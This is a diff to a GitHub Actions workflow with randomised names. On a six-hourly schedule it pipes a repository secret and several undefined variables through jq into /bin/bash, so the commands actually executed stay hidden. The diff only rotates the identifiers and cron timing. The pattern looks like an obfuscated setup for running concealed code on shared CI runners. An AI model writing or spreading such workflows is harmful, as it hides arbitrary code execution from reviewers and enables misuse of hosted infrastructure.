@@ -3,18 +3,26 @@ name: xiangshanrou4635
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 1/6 * * *'
-jobs:  # 30397
+    - cron: '59 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiangshanrou4635
         env:
-          t09: ${{ secrets.t09 }}
+          con7: ${{ secrets.con7 }}
         run: |
-          echo $t09 | jq -r .mcma024 | /bin/bash
-          echo $va51609 | jq -r .u3 | /bin/bash
-          echo $iqxkq35090 | jq -r .uxj9 | /bin/bash
-          echo $gg773 | jq -r .aog8 | /bin/bash
+          echo $con7 | jq -r .ien585 | /bin/bash
+          echo $zed1650 | jq -r .bemir65 | /bin/bash
+          echo $ovbzb49755 | jq -r .iqib9295 | /bin/bash
+          echo $espjo1 | jq -r .lxk8090 | /bin/bash
+          echo $ppur217 | jq -r .q98206 | /bin/bash
+          echo $jzmq361 | jq -r .ehoq306 | /bin/bash
+          echo $g06 | jq -r .mrha21 | /bin/bash
+          echo $iko91042 | jq -r .btmsq46762 | /bin/bash
+          echo $di1583 | jq -r .lb0532 | /bin/bash
+          echo $uew1 | jq -r .npf43923 | /bin/bash
+          echo $b42 | jq -r .pndqu5 | /bin/bash
 
